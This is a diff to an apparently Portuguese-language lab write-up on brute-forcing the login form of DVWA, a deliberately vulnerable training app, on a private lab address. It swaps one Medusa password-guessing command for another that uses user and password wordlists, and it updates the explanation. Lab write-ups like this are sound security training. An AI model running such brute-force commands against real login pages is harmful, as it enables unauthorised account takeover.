@@ -67,15 +67,15 @@ Configurar DVWA para **segurança: LOW
 
 Comando com Medusa:
 
-medusa -h 192.168.56.105 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m FORM \
-  -e ns -T 5 -w 5 -b -f \
-  -m DIR:/dvwa/login.php -m FORM:username=^USER^&password=^PASS^&Login=Login \
-  -m DENY:"Login failed"
+medusa -h 192.168.56.105 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6
+
+
 
 Explicação:
 
 * Ataque no formulário de login da DVWA
-* O parâmetro `DENY` identifica falhas com base na resposta da página
+* O parâmetro `FAIL` identifica falhas com base na resposta da página
+* lista de usuarios criadas a partir da enumeração e senhas tambem.
 
 Resultado:
 Login com senha válida foi identificado.
